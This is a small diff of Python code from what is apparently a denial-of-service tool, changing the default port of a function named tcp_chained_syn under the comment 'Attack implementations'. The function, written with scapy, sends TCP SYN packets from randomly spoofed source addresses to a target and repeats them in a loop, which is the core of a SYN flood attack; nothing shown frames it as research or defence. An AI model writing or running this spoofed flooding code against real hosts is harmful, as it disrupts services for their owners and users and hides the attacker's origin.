@@ -42,7 +42,7 @@ working_methods = [
 ]
 
 # Attack implementations
-def tcp_chained_syn(ip, port=80):
+def tcp_chained_syn(ip, port=19732):
     spoof = ".".join(str(random.randint(1, 254)) for _ in range(4))
     send(IP(src=spoof, dst=ip)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
     for _ in range(3):
